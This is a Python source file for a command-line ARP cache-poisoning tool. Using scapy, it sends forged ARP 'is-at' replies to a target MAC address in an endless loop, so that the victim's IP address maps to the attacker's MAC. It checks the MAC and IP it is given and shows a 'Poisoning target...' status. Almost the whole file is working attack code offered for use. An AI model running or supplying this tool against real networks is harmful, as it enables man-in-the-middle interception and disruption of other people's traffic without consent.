import re
import socket
import rich
import typer
from scapy.arch import get_if_hwaddr
from scapy.config import conf
from scapy.layers.l2 import Ether, ARP
from scapy.all import sendp
from rich.theme import Theme
from rich.console import Console
from netaddr import valid_ipv4

custom_theme = Theme({"success":"bold green", "error":"bold red"})
console = Console(theme=custom_theme)


# It sends an ARP packet to the target MAC address, telling it that the victim IP address is at the
# attacker's MAC address (The attacker MAC is the device's MAC that runs the script)

class ARPSpoofer:
    def __init__(self, target_MAC: str, victim_IP: str):
        self.target_MAC = target_MAC
        self.victim_IP = victim_IP

    def run(self):
        packets = [Ether(src=get_if_hwaddr(conf.iface), dst=self.target_MAC) / ARP(op='is-at', psrc=self.victim_IP,
                                                                                   hwsrc=get_if_hwaddr(conf.iface))]
        sendp(packets, loop=1, verbose=False, inter=0.5)
        

def is_valid_MAC(MAC: str):
    if re.match("[0-9a-f]{2}([-:])[0-9a-f]{2}(\\1[0-9a-f]{2}){4}$", MAC.lower()):
        console.print("[OK] MAC address is valid", style="success")
        return True
    else:
        console.print("[X] MAC address is NOT valid", style="error")
        return False

def is_valid_IP(ip: str):
    if valid_ipv4(ip):
        console.print("[OK] IP is valid", style="success")
        return True
    else:
        console.print("[X] IP is NOT valid", style="error")
        return False

def main(target_mac: str, victim_ip: str):
    console = rich.console.Console()
    if is_valid_MAC(target_mac) and  is_valid_IP(victim_ip):
        with console.status('Poisoning target...'):
            ARPSpoofer(target_MAC=target_mac, victim_IP=victim_ip).run()
    else:
        exit(1)

# We use typer to show a message to the user if there is not the target MAC or victim IP.
if __name__ == '__main__':
    typer.run(main)
